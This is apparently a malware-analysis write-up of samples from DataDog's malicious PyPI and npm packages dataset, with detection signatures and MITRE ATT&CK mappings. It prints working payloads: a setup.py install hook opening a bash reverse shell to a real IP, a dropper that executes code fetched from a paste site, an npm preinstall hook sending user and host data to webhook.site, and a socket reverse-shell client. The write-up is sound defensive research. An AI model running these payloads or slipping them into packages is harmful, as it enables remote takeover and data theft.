# DataDog Malicious Packages Dataset - Real Sample Analysis

**Source**: https://github.com/DataDog/malicious-software-packages-dataset
**License**: Apache-2.0
**Total Samples**: 17,952 (PyPI + npm)
**Extraction Date**: January 2026
**Password**: `infected`

## Analyzed Samples

### 1. Reverse Shell via setup.py (boogishell, myshellcode, shellapp)

**Package Family**: boogipop malware suite
**C2 Server**: 114.116.119.253:7777
**MITRE ATT&CK**: T1059.004 (Command and Scripting Interpreter: Unix Shell)

```python
# Pattern: Custom setuptools install command with bash reverse shell
from setuptools.command.install import install
import os

class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        os.system("bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'")

setup(
    cmdclass={'install': CustomInstallCommand},
)
```

**Detection Signatures**:
- `os.system` with `/dev/tcp/` pattern
- `CustomInstallCommand` class extending `install`
- Bash reverse shell redirection pattern

---

### 2. Fileless Dropper (discord-hook)

**Technique**: Download and execute from pastebin
**C2**: paste.bingner.com
**MITRE ATT&CK**: T1059.006 (Python), T1105 (Ingress Tool Transfer)

```python
# Pattern: Temp file + exec(urlopen()) + hidden execution
from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _eexecutable
from os import system as _ssystem

_ttmp = _ffile(delete=False)
_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/4yndv/raw').read())""")
_ttmp.close()
_ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
```

**Detection Signatures**:
- `exec(urlopen(...).read())` pattern
- Variable name obfuscation (underscore prefixes)
- `pythonw.exe` for hidden execution
- Pastebin/paste site URLs

---

### 3. npm Dependency Confusion (0vulns-dependency-confusion-poc)

**Technique**: preinstall hook for data exfiltration
**C2**: webhook.site
**MITRE ATT&CK**: T1195.002 (Supply Chain Compromise)

```json
{
  "scripts": {
    "preinstall": "wget --quiet \"https://webhook.site/UUID?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\""
  },
  "config": {
    "unsafe-perm": true
  }
}
```

**Detection Signatures**:
- `preinstall` or `postinstall` with shell commands
- Command substitution: `$(whoami)`, `$(hostname)`, `$(pwd)`
- External URLs in npm scripts
- `unsafe-perm: true` config

---

### 4. Advanced Multi-Protocol Reverse Shell (ReverseShell package)

**Protocols**: TCP, UDP, HTTP, HTTPS (encrypted), IRC, DNS
**Author**: mauricelambert434
**MITRE ATT&CK**: T1071 (Application Layer Protocol)

```python
# TCP client pattern
from socket import socket
from subprocess import run, PIPE

s = socket()
s.connect(("127.0.0.1", 1337))
command = s.recv(65535).decode()
p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
s.sendall(p.stdout + p.stderr)
```

**Obfuscated HTTPS variant** (one-liner):
```bash
python3 -c "exec('from json import dumps;from platform import node as h...')"
```

**Detection Signatures**:
- `subprocess.run(..., shell=True)`
- Socket connections to hardcoded IPs
- System info gathering: `platform.node()`, `getuser()`, `getcwd()`
- RC4-style encryption patterns

---

### 5. Full-Featured Spyware (SpyWare package)

**Author**: mauricelambert434
**Modules**: KeyLogger, ScreenLogger, WebcamLogger, AudioLogger, ClipboardLogger, DomainsLogger, FilesLogger
**MITRE ATT&CK**: T1056 (Input Capture), T1113 (Screen Capture), T1125 (Video Capture)

**Detection Signatures**:
- Module names containing "Logger"
- PyAudio, OpenCV dependencies
- Keyboard hook patterns
- Clipboard monitoring patterns

---

## Summary Statistics

| Category | Count | Example Packages |
|----------|-------|------------------|
| Reverse Shell | 10+ | boogishell, myshellcode, reverseshell |
| Droppers | 5+ | discord-hook, discord-manager |
| Dep Confusion | 50+ | 0vulns-dependency-confusion-poc |
| Typosquatting | 1000+ | requests-darwin-lite, colorama variants |
| Spyware | 3+ | SpyWare, spyme |
| Credential Theft | 20+ | exo-steal, pycryptoconf |

## C2 Infrastructure Observed

| Domain/IP | Port | Protocol | Used By |
|-----------|------|----------|---------|
| 114.116.119.253 | 7777 | TCP | boogipop suite |
| paste.bingner.com | 443 | HTTPS | discord-hook |
| webhook.site | 443 | HTTPS | dep confusion |
| 127.0.0.1 | 1337 | TCP | ReverseShell |

## References

- DataDog GuardDog: https://github.com/DataDog/guarddog
- Semgrep Rules: guarddog/analyzer/sourcecode/*.yml
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1195/002/
